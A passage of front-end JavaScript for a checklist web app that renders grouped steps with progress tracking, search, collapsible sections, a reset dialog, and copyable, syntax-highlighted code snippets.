      phaseMeta.innerHTML = phaseMetaHtml;
      body.appendChild(phaseMeta);
    }

    const currentItems = [];

    tasks.forEach((task) => {
      const node = dom.taskTemplate.content.firstElementChild.cloneNode(true);
      node.style.setProperty('--step-accent', stepAccentFor(task.step || phaseName));
      const checkbox = node.querySelector('.task-check');
      const titleEl = node.querySelector('.task-title');
      const metaEl = node.querySelector('.task-meta');
      const snippetBtn = node.querySelector('.task-snippet-btn');
      const snippetStack = node.querySelector('.snippet-stack');
      const metadata = buildStepMetadata(task);
      const stepIndex = String(task.step_index || '').trim();

      if (stepIndex) {
        const stepIndexEl = document.createElement('span');
        stepIndexEl.className = 'step-index';
        stepIndexEl.textContent = stepIndex;
        checkbox.before(stepIndexEl);
      }

      titleEl.textContent = task.title;
      const stepMetaHtml = renderMetadataInline(metadata, 'step');
      metaEl.hidden = !stepMetaHtml;
      if (stepMetaHtml) {
        metaEl.innerHTML = stepMetaHtml;
      }
      checkbox.checked = !!state.checked[task.id];
      checkbox.setAttribute('aria-label', `Mark step ${task.title} complete`);
      snippetStack.setAttribute('hidden', '');

      if (Array.isArray(task.snippets) && task.snippets.length > 0) {
        node.classList.add('is-clickable');
        task.snippets.forEach((snippet, blockIdx) => {
          const snippetNode = dom.snippetTemplate.content.firstElementChild.cloneNode(true);
          const langNode = snippetNode.querySelector('.snippet-lang');
          const codeNode = snippetNode.querySelector('code');
          const copyBtn = snippetNode.querySelector('.snippet-copy');

          const rawLang = (snippet.lang || '').trim();
          const lang = normalizeSnippetLanguage(rawLang);
          const kind = getSnippetKind(lang);
          const displayLang = rawLang || lang || 'text';

          snippetNode.dataset.kind = kind;
          snippetNode.dataset.lang = lang;
          langNode.textContent = `${displayLang} ${task.snippets.length > 1 ? `#${blockIdx + 1}` : ''}`.trim();
          codeNode.textContent = snippet.code || '';
          highlightSnippet(codeNode, lang, snippet.code || '');

          copyBtn.addEventListener('click', (event) => {
            event.stopPropagation();
            copyText(snippet.code || '');
            flashAutoCopied(snippetNode, 'Copied');
          });

          snippetStack.appendChild(snippetNode);
        });

        setChipButtonLabel(snippetBtn, `Show snippets (${task.snippets.length})`);
        snippetBtn.addEventListener('click', (event) => {
          event.stopPropagation();
          const hidden = snippetStack.hasAttribute('hidden');
          setSnippetVisibility(snippetStack, snippetBtn, task.snippets.length, hidden);
        });

        node.addEventListener('click', (event) => {
          if (shouldOpenSnippetFromStepClick(event.target)) {
            const hidden = snippetStack.hasAttribute('hidden');
            setSnippetVisibility(snippetStack, snippetBtn, task.snippets.length, hidden);
          }
        });
      } else {
        setChipButtonLabel(snippetBtn, 'No snippet in source');
        snippetBtn.disabled = true;
      }

      checkbox.addEventListener('change', () => {
        state.checked[task.id] = checkbox.checked;
        saveState();
        updateProgress();
        refreshPhaseStats();
      });

      const searchableSnippets = (task.snippets || []).map((s) => s.code || '').join('\n');
      const ref = {
        id: task.id,
        phase: phaseName,
        node,
        checkbox,
        searchBlob: normalize([
          phaseName,
          task.step_index,
          task.step,
          task.title,
          toSearchText(metadata.brief_description),
          toSearchText(metadata.feasible_when),
          toSearchText(phaseMetadata.brief_description),
          toSearchText(phaseMetadata.feasible_when),
          searchableSnippets
        ].join(' '))
      };

      currentItems.push(ref);
      itemRefs.push(ref);
      body.appendChild(node);
    });

    header.addEventListener('click', () => {
      const next = !section.classList.contains('is-collapsed');
      section.classList.toggle('is-collapsed', next);
      state.collapsed[phaseName] = next;
      saveState();
      updatePhaseHeader(section, currentItems.length, currentItems.filter((it) => it.checkbox.checked).length, currentItems.filter((it) => !it.node.classList.contains('is-hidden')).length);
    });

    phaseDone.addEventListener('click', (event) => {
      event.stopPropagation();
    });

    phaseDoneCheck.addEventListener('click', (event) => {
      event.stopPropagation();
    });

    phaseDoneCheck.addEventListener('change', () => {
      const shouldCheck = phaseDoneCheck.checked;
      currentItems.forEach((itemRef) => {
        itemRef.checkbox.checked = shouldCheck;
        state.checked[itemRef.id] = shouldCheck;
      });
      saveState();
      updateProgress();
      refreshPhaseStats();
    });

    section.append(header, body);
    dom.phaseContainer.appendChild(section);

    if (state.collapsed[phaseName]) {
      section.classList.add('is-collapsed');
    }

    phaseRefs.push({
      phaseName,
      section,
      items: currentItems,
      phaseDoneCheck
    });
  });

  refreshPhaseStats();

  dom.phaseCountChip.textContent = `${phaseRefs.length} groups`;
  dom.taskCountChip.textContent = `${CHECKLIST_DATA.length} steps`;
}

function refreshPhaseStats() {
  for (const phaseRef of phaseRefs) {
    const total = phaseRef.items.length;
    const done = phaseRef.items.filter((item) => item.checkbox.checked).length;
    const visible = phaseRef.items.filter((item) => !item.node.classList.contains('is-hidden')).length;
    updatePhaseHeader(phaseRef.section, total, done, visible);
  }
  renderNav();
  applyActivePhaseFilter();
}

function updatePhaseHeader(section, total, done, visible) {
  const counts = section.querySelector('.phase-counts');
  const toggle = section.querySelector('.phase-toggle');
  const phaseDoneCheck = section.querySelector('.phase-done-check');

  counts.textContent = `${done}/${total} completed`;
  setPhaseToggleState(toggle, section.classList.contains('is-collapsed'));

  if (phaseDoneCheck) {
    const allDone = total > 0 && done === total;
    phaseDoneCheck.checked = allDone;
    phaseDoneCheck.indeterminate = done > 0 && done < total;
  }
}

function setPhaseToggleState(toggleNode, collapsed) {
  if (!toggleNode) {
    return;
  }

  const label = collapsed ? 'Expand' : 'Collapse';
  const iconPath = collapsed
    ? 'M12 14.6 6.7 9.3l1.4-1.4L12 11.8l3.9-3.9 1.4 1.4L12 14.6Zm0 6-5.3-5.3 1.4-1.4L12 17.8l3.9-3.9 1.4 1.4L12 20.6Z'
    : 'M12 9.4 6.7 14.7l1.4 1.4L12 12.2l3.9 3.9 1.4-1.4L12 9.4Zm0-6-5.3 5.3 1.4 1.4L12 6.2l3.9 3.9 1.4-1.4L12 3.4Z';

  toggleNode.innerHTML = `<svg class="phase-toggle-icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="${iconPath}"></path></svg><span class="phase-toggle-label">${label}</span>`;
}

function updateProgress() {
  const total = CHECKLIST_DATA.length;
  const done = CHECKLIST_DATA.filter((item) => !!state.checked[item.id]).length;
  const pct = total ? Math.round((done / total) * 100) : 0;

  dom.progressText.textContent = `${done}/${total} (${pct}%)`;
  dom.progressFill.style.width = `${pct}%`;
}

function applyFilter(value) {
  const query = normalize(value);

  itemRefs.forEach((item) => {
    const match = !query || item.searchBlob.includes(query);
    item.node.classList.toggle('is-hidden', !match);
  });

  phaseRefs.forEach((phaseRef) => {
    const visible = phaseRef.items.filter((item) => !item.node.classList.contains('is-hidden')).length;
    phaseRef.section.classList.toggle('is-hidden', visible === 0);
  });

  refreshPhaseStats();
}

function setAllPhasesCollapsed(collapsed) {
  phaseRefs.forEach((phaseRef) => {
    phaseRef.section.classList.toggle('is-collapsed', collapsed);
    state.collapsed[phaseRef.phaseName] = collapsed;
  });
  saveState();
  refreshPhaseStats();
}

function resetProgress() {
  openResetModal();
}

function openResetModal() {
  if (!dom.resetModal) {
    return;
  }

  resetModalReturnFocusEl = document.activeElement instanceof HTMLElement ? document.activeElement : null;
  dom.resetModal.removeAttribute('hidden');
  document.body.classList.add('modal-open');
  if (dom.resetModalCancel) {
    dom.resetModalCancel.focus();
  }
}

function closeResetModal() {
  if (!dom.resetModal || dom.resetModal.hasAttribute('hidden')) {
    return;
  }

  dom.resetModal.setAttribute('hidden', '');
  document.body.classList.remove('modal-open');

  if (resetModalReturnFocusEl && typeof resetModalReturnFocusEl.focus === 'function') {
    resetModalReturnFocusEl.focus();
  }
  resetModalReturnFocusEl = null;
}

function confirmResetProgress() {
  state.checked = {};
  itemRefs.forEach((item) => {
    item.checkbox.checked = false;
  });

  saveState();
  updateProgress();
  refreshPhaseStats();
  closeResetModal();
}

function handleGlobalKeydown(event) {
  if (event.key !== 'Escape') {
    return;
  }
  if (!dom.resetModal || dom.resetModal.hasAttribute('hidden')) {
    return;
  }
  event.preventDefault();
  closeResetModal();
}

function setSnippetVisibility(snippetStack, snippetBtn, snippetCount, open) {
  if (open) {
    snippetStack.removeAttribute('hidden');
    setChipButtonLabel(snippetBtn, `Hide snippets (${snippetCount})`);
    return;
  }
  snippetStack.setAttribute('hidden', '');
  setChipButtonLabel(snippetBtn, `Show snippets (${snippetCount})`);
}

function setChipButtonLabel(button, label) {
  const labelNode = button && button.querySelector ? button.querySelector('.chip-label') : null;
  if (labelNode) {
    labelNode.textContent = label;
    return;
  }
  if (button) {
    button.textContent = label;
  }
}

function expandGroupSection(sectionNode, phaseName) {
  if (!sectionNode || !sectionNode.classList.contains('is-collapsed')) {
    return;
  }

  sectionNode.classList.remove('is-collapsed');
  state.collapsed[phaseName] = false;
  saveState();

  const total = sectionNode.querySelectorAll('.task-check').length;
  const done = sectionNode.querySelectorAll('.task-check:checked').length;
  const visible = sectionNode.querySelectorAll('.task-card:not(.is-hidden)').length;
  updatePhaseHeader(sectionNode, total, done, visible);
}

function shouldOpenSnippetFromStepClick(target) {
  if (!(target instanceof Element)) {
    return false;
  }
  if (target.closest('.task-check')) {
    return false;
  }
  if (target.closest('.task-snippet-btn')) {
    return false;
  }
  if (target.closest('.snippet-copy')) {
    return false;
  }
  if (target.closest('.snippet-stack')) {
    return false;
  }
  return true;
}

function shouldSkipActivePhaseReset(target) {
  if (!(target instanceof Element)) {
    return true;
  }

  if (target.closest('#phaseNav')) {
    return true;
  }

  if (target.closest('.phase-card')) {
    return true;
  }

  if (target.closest('.modal-shell, .modal-backdrop')) {
    return true;
  }

  if (target.closest('button, input, select, textarea, label, a, summary, [role="button"], [contenteditable="true"]')) {
    return true;
  }

  return false;
}

function handleDocumentClick(event) {
  if (!activePhaseFilter) {
    return;
  }

  if (shouldSkipActivePhaseReset(event.target)) {
    return;
  }

  clearActiveGroupSelection();
}

function bindEvents() {
  dom.searchInput.addEventListener('input', (event) => {
    applyFilter(event.target.value || '');
  });

  dom.expandBtn.addEventListener('click', () => setAllPhasesCollapsed(false));
  dom.collapseBtn.addEventListener('click', () => setAllPhasesCollapsed(true));
  dom.resetBtn.addEventListener('click', resetProgress);
  if (dom.resetModalCancel) {
    dom.resetModalCancel.addEventListener('click', closeResetModal);
  }
  if (dom.resetModalConfirm) {
    dom.resetModalConfirm.addEventListener('click', confirmResetProgress);
  }
  if (dom.resetModal) {
    dom.resetModal.addEventListener('click', (event) => {
      if (event.target === dom.resetModal) {
        closeResetModal();
      }
    });
  }
  document.addEventListener('click', handleDocumentClick);
  document.addEventListener('mouseup', handleSnippetSelectionCopy);
  document.addEventListener('keyup', handleSnippetSelectionCopy);
  document.addEventListener('touchend', handleSnippetSelectionCopy, { passive: true });
  document.addEventListener('keydown', handleGlobalKeydown);
}

function copyText(text) {
  if (!text) {
    return;
  }

  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(text).catch(() => {});
    return;
  }

  const area = document.createElement('textarea');
  area.value = text;
  area.setAttribute('readonly', '');
  area.style.position = 'fixed';
  area.style.top = '-9999px';
  document.body.appendChild(area);
  area.select();
  document.execCommand('copy');
  document.body.removeChild(area);
}

function handleSnippetSelectionCopy() {
  const selection = window.getSelection();
  if (!selection || selection.rangeCount === 0 || selection.isCollapsed) {
    return;
  }

  const text = selection.toString().trim();
  if (!text) {
    return;
  }

  const anchorBlock = findSnippetBlock(selection.anchorNode);
  const focusBlock = findSnippetBlock(selection.focusNode);

  if (!anchorBlock || !focusBlock || anchorBlock !== focusBlock) {
    return;
  }

  const now = Date.now();
  if (text === lastAutoCopiedText && now - lastAutoCopiedAt < 1200) {
    return;
  }

  lastAutoCopiedText = text;
  lastAutoCopiedAt = now;
  copyText(text);
  flashAutoCopied(anchorBlock);
}

function findSnippetBlock(node) {
  if (!node) {
    return null;
  }
  const element = node.nodeType === Node.TEXT_NODE ? node.parentElement : node;
  if (!element || !element.closest) {
    return null;
  }
  return element.closest('.snippet-block');
}

function flashAutoCopied(block, message = 'Copied') {
  if (!block) {
    return;
  }

  const copyButton = block.querySelector('.snippet-copy');
  setCopyButtonFeedback(copyButton, message, COPY_FEEDBACK_DURATION_MS);

  if (block.__copyFeedbackTimer) {
    window.clearTimeout(block.__copyFeedbackTimer);
  }

  block.classList.add('is-copied');

  block.__copyFeedbackTimer = window.setTimeout(() => {
    block.classList.remove('is-copied');
    block.__copyFeedbackTimer = null;
  }, COPY_FEEDBACK_DURATION_MS);
}

function setCopyButtonFeedback(button, label = 'Copied', duration = COPY_FEEDBACK_DURATION_MS) {
  if (!button) {
    return;
  }

  if (button.__copyFeedbackTimer) {
    window.clearTimeout(button.__copyFeedbackTimer);
  }

  button.textContent = String(label || 'Copied');
  button.classList.add('is-copied');

  button.__copyFeedbackTimer = window.setTimeout(() => {
    button.textContent = 'Copy';
    button.classList.remove('is-copied');
    button.__copyFeedbackTimer = null;
  }, duration);
}

function normalizeSnippetLanguage(lang) {
  const normalized = String(lang || '').toLowerCase().trim();
  if (!normalized) {
    return 'plaintext';
  }
  return SNIPPET_LANG_ALIASES[normalized] || normalized;
}

function getSnippetKind(lang) {
  if (['bash', 'sh', 'zsh', 'shell', 'plaintext'].includes(lang)) {
    return 'terminal';
  }
  if (['powershell', 'dos'].includes(lang)) {
    return 'windows';
  }
  if (['sql', 'mysql', 'postgresql'].includes(lang)) {
    return 'database';
  }
  if (['javascript', 'js', 'typescript', 'ts', 'python', 'ruby', 'perl', 'php'].includes(lang)) {
    return 'scripting';
  }
  if (['http', 'html', 'xml', 'json', 'yaml', 'toml', 'ini'].includes(lang)) {
    return 'web';
  }
  return 'generic';
}

function highlightSnippet(codeNode, lang, rawCode) {
  if (isShellLanguage(lang)) {
    codeNode.classList.add('is-shell-highlighted');
    codeNode.innerHTML = renderShellSnippet(rawCode || '');
    return;
  }

  if (!codeNode || !window.hljs) {
    return;
  }
  try {
    if (lang && lang !== 'plaintext' && window.hljs.getLanguage(lang)) {
      codeNode.classList.add(`language-${lang}`);
    }
    window.hljs.highlightElement(codeNode);
  } catch {
    // Keep plain text rendering if highlighting fails.
  }
}

function isShellLanguage(lang) {
  return ['bash', 'sh', 'zsh', 'shell', 'powershell', 'dos', 'cmd', 'plaintext'].includes(lang);
}

function renderShellSnippet(code) {
  const lines = String(code || '').split('\n');
  return lines.map((line) => renderShellLine(line)).join('\n');
}

function renderShellLine(line) {
  if (!line) {
    return '';
  }

  if (/^\s*#/.test(line)) {
    return `<span class="sh-comment">${escapeHtml(line)}</span>`;
  }

  const [commandPart, commentPart] = splitInlineComment(line);
  const renderedCommand = renderShellCommandPart(commandPart);
  const renderedComment = commentPart ? `<span class="sh-comment">${escapeHtml(commentPart)}</span>` : '';
  return `${renderedCommand}${renderedComment}`;
}

function splitInlineComment(line) {
  let inSingle = false;
  let inDouble = false;
  let escaped = false;

  for (let i = 0; i < line.length; i++) {
    const ch = line[i];

    if (escaped) {
      escaped = false;
      continue;
    }

    if (ch === '\\') {
      escaped = true;
      continue;
    }

    if (!inDouble && ch === '\'') {
      inSingle = !inSingle;
      continue;
    }

    if (!inSingle && ch === '"') {
      inDouble = !inDouble;
      continue;
    }

    if (!inSingle && !inDouble && ch === '#' && (i === 0 || /\s/.test(line[i - 1]))) {
      return [line.slice(0, i), line.slice(i)];
    }
  }

  return [line, ''];
}

function renderShellCommandPart(part) {
  const tokens = String(part || '').match(/(\s+|[^\s]+)/g) || [];
  let commandIndex = -1;

  for (let i = 0; i < tokens.length; i++) {
    const token = tokens[i];
    if (/^\s+$/.test(token)) {
      continue;
    }
    if (isShellEnvAssignment(token)) {
      continue;
    }
    commandIndex = i;
    break;
  }

  return tokens.map((token, i) => {
    if (/^\s+$/.test(token)) {
      return token;
    }

    const safe = escapeHtml(token);

    if (i < commandIndex && isShellEnvAssignment(token)) {
      return `<span class="sh-env">${safe}</span>`;
    }
    if (i === commandIndex) {
      return `<span class="sh-cmd">${safe}</span>`;
    }
    if (isShellPlaceholder(token)) {
      return `<span class="sh-arg">${safe}</span>`;
    }
    if (isShellArg(token)) {
      return `<span class="sh-arg">${safe}</span>`;
    }
    if (/^\$[A-Za-z_][A-Za-z0-9_]*$/.test(token)) {
      return `<span class="sh-var">${safe}</span>`;
    }
    return safe;
  }).join('');
}

function isShellEnvAssignment(token) {
  return /^[A-Za-z_][A-Za-z0-9_]*=.*/.test(token);
}

function isShellArg(token) {
  return (
    /^--?[A-Za-z0-9]/.test(token) ||
    /^\/[A-Za-z0-9]/.test(token)
  );
}

function isShellPlaceholder(token) {
  return /^<[^<>\s]+>$/.test(token);
}

function enrichChecklistData(items) {
  const phaseStepState = new Map();

  items.forEach((item) => {
    const rawStep = String(item.step || '').trim();
    const normalizedStep = stripSectionPrefix(rawStep || shortPhase(item.phase));
    const explicitStepIndex = extractStepIndex(rawStep);

    item.step = normalizedStep || 'Core workflow';
    item.step_index = explicitStepIndex;

    item.brief_description = normalizeMarkdownField(
      item.brief_description,
      { ensureSentence: true }
    );
    item.feasible_when = normalizeMarkdownField(
      item.feasible_when
    );

    if (!item.step_index) {
      const phaseKey = String(item.phase || '');
      let phaseInfo = phaseStepState.get(phaseKey);
      if (!phaseInfo) {
        phaseInfo = {
          phaseIndex: extractPhaseIndex(phaseKey),
          nextSubIndex: 1,
          stepToIndex: new Map()
        };
        phaseStepState.set(phaseKey, phaseInfo);
      }

      const stepKey = rawStep
        ? item.step
        : `__missing_step__:${item.id || item.title || phaseInfo.nextSubIndex}`;

      if (!phaseInfo.stepToIndex.has(stepKey)) {
        const fallbackIndex = phaseInfo.phaseIndex
          ? `${phaseInfo.phaseIndex}.${phaseInfo.nextSubIndex}`
          : String(phaseInfo.nextSubIndex);
        phaseInfo.stepToIndex.set(stepKey, fallbackIndex);
        phaseInfo.nextSubIndex += 1;
      }

      item.step_index = phaseInfo.stepToIndex.get(stepKey);
    }
  });
}

function warnMissingFeasibleWhen(items) {
  const missingIds = items
    .filter((item) => !String(item.feasible_when || '').trim())
    .map((item) => item.id || item.title || 'unknown-item');

  if (missingIds.length > 0) {
    console.warn(`Missing feasible_when on ${missingIds.length} checklist entries: ${missingIds.join(', ')}`);
  }
}

function enrichPhaseMetadata() {
  phaseMetaMap.clear();
  for (const [phaseName, tasks] of phaseMap.entries()) {
    phaseMetaMap.set(phaseName, createPhaseMetadata(phaseName, tasks));
  }
}

function buildStepMetadata(task) {
  return {
    brief_description: task.brief_description,
    feasible_when: task.feasible_when
  };
}

function createPhaseMetadata(phaseName, tasks) {
  const phaseOverrides = GROUP_METADATA[phaseName] || {};
  const providedBrief = phaseOverrides.brief_description || pickFirstGroupField(tasks, 'group_brief_description');
  const providedFeasibleWhen = phaseOverrides.feasible_when || pickFirstGroupField(tasks, 'group_feasible_when');

  return {
    brief_description: normalizeMarkdownField(providedBrief, { ensureSentence: true }),
    feasible_when: normalizeMarkdownField(providedFeasibleWhen)
  };
}

function pickFirstGroupField(tasks, fieldName) {
  for (const task of tasks) {
    const value = task && task[fieldName];
    if (Array.isArray(value) && value.length > 0) {
      return value;
    }
    if (typeof value === 'string' && value.trim()) {
      return value;
    }
  }
  return '';
}

function renderMetadataInline(metadata, scope = 'step') {
  const brief = compactMarkdownText(metadata.brief_description);
  const when = compactMarkdownText(metadata.feasible_when);
  const parts = [];

  if (brief) {
    parts.push(
      `<p class="meta-brief-line" title="${escapeHtml(brief)}">` +
        `<span class="meta-key">DESC:</span>` +
        `<span class="meta-brief-text">${renderInlineMarkdown(brief)}</span>` +
      `</p>`
    );
  }
  if (when) {
    parts.push(
      `<p class="meta-when-line" title="${escapeHtml(when)}">` +
        `<span class="meta-key">WHEN:</span>` +
        `<span class="meta-when-text">${renderInlineMarkdown(when)}</span>` +
      `</p>`
    );
  }

  if (parts.length === 0) {
    return '';
  }

  return `<div class="meta-inline meta-inline-${scope}">${parts.join('')}</div>`;
}

function renderInlineMarkdown(text) {
  let html = escapeHtml(text);

  html = html.replace(
    /\[([^\]]+)\]\((https?:\/\/[^\s)]+)\)/gi,
    '<a href="$2" target="_blank" rel="noopener noreferrer">$1</a>'
  );
  html = html.replace(/`([^`]+)`/g, '<code>$1</code>');
  html = html.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
  html = html.replace(/\*([^*]+)\*/g, '<em>$1</em>');

  return html;
}

function compactMarkdownText(markdownText) {
  return String(markdownText || '')
    .replace(/\r\n/g, '\n')
    .split('\n')
    .map((line) => line.trim())
    .filter(Boolean)
    .map((line) => line.replace(/^[-*]\s+/, '').replace(/^\d+\.\s+/, ''))
    .join(' · ');
}

function normalizeMarkdownField(value, options = {}) {
  const ensureSentence = !!options.ensureSentence;
  const fromValue = Array.isArray(value)
    ? value.map((line) => String(line || '').trim()).filter(Boolean).join('\n')
    : (value == null ? '' : String(value).trim());

  if (!fromValue) {
    return '';
  }
  if (!ensureSentence || hasMarkdownStructure(fromValue)) {
    return fromValue;
  }
  return ensurePeriod(fromValue);
}

function hasMarkdownStructure(value) {
  const text = String(value || '');
  return (
    /\n/.test(text) ||
    /^\s*[-*]\s+/m.test(text) ||
    /^\s*\d+\.\s+/m.test(text) ||
    /`[^`]+`/.test(text) ||
    /\*\*[^*]+\*\*/.test(text) ||
    /\[[^\]]+\]\([^)]+\)/.test(text)
  );
}

function toSearchText(value) {
  return String(value || '')
    .replace(/\[([^\]]+)\]\(([^)]+)\)/g, '$1 $2')
    .replace(/`([^`]+)`/g, '$1')
    .replace(/\*\*([^*]+)\*\*/g, '$1')
    .replace(/\*([^*]+)\*/g, '$1')
    .replace(/^\s*[-*]\s+/gm, '')
    .replace(/^\s*\d+\.\s+/gm, '')
    .replace(/\s+/g, ' ')
    .trim();
}

function stripSectionPrefix(value) {
  return String(value || '').replace(/^\d+(?:\.\d+)*\s*/, '').trim();
}

function extractStepIndex(value) {
  const match = String(value || '').trim().match(/^(\d+(?:\.\d+)+)\b/);
  return match ? match[1] : '';
}

function extractPhaseIndex(value) {
  const match = String(value || '').trim().match(/^(\d+)\./);
  return match ? match[1] : '';
}

function ensurePeriod(value) {
  const text = String(value || '').trim();
  if (!text) {
    return 'Complete and validate this step.';
  }
  return /[.!?]$/.test(text) ? text : `${text}.`;
}

function normalize(value) {
  return String(value || '').toLowerCase().replace(/\s+/g, ' ').trim();
}

function shortPhase(phaseName) {
  return phaseName.replace(/^\d+\.\s*/, '');
}

function phaseId(phaseName) {
  return `phase-${phaseName.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-+|-+$/g, '')}`;
}

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}


